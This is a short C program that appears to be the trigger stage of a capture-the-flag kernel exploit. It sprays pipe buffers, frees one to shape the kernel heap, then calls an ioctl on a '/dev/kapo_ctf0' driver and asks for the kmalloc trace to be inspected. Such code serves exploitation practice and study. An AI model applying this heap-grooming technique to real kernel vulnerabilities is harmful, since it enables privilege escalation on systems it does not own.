// SPDX-License-Identifier: GPL-2.0
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define KAPO_FETCH_RECORDS _IO('K', 1)
#define PIPE_COUNT 64
#define PAGE_SIZE 4096

int main(void)
{
	char page[PAGE_SIZE] = { 0 };
	int pipes[PIPE_COUNT][2];
	int device;
	int i;

	for (i = 0; i < PIPE_COUNT; i++) {
		if (pipe(pipes[i]) ||
		    write(pipes[i][1], page, sizeof(page)) != sizeof(page)) {
			perror("pipe spray");
			return 1;
		}
	}
	close(pipes[PIPE_COUNT - 2][0]);
	close(pipes[PIPE_COUNT - 2][1]);

	device = open("/dev/kapo_ctf0", O_RDONLY);
	if (device < 0) {
		perror("open /dev/kapo_ctf0");
		return 1;
	}
	if (ioctl(device, KAPO_FETCH_RECORDS) < 0) {
		perror("KAPO_FETCH_RECORDS");
		return 1;
	}
	printf("adjacency trigger complete; inspect kmalloc trace\n");
	pause();
}
